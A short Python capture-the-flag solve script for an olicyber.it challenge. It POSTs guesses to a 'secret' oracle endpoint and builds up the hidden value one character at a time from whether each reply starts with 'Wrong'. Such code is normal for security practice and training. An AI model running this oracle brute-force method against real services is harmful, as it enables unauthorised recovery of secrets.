import requests

oracle_url = "http://delphi.challs.olicyber.it/secret"
size = len("mmmmmmmmmmmmmmmmmmmmmm")

def try_guess(guess):
    response = requests.post(oracle_url, data={"secret": guess})
    return response.text
secret = ""
print("?", end="")
while True:
    for ch in "_abcdefghijklmnopqrstuvwxyz":
        print('\r' + secret + ch, end="")
        secret += ch
        response = try_guess(secret)
        if "prophecy" in response:
            print('\n{}'.format(response.splitlines()[-1].strip()))
            exit(0)
        elif not response.startswith("Wrong"): break
        else: secret = secret[:-1]
    if len(secret) == size:
        break

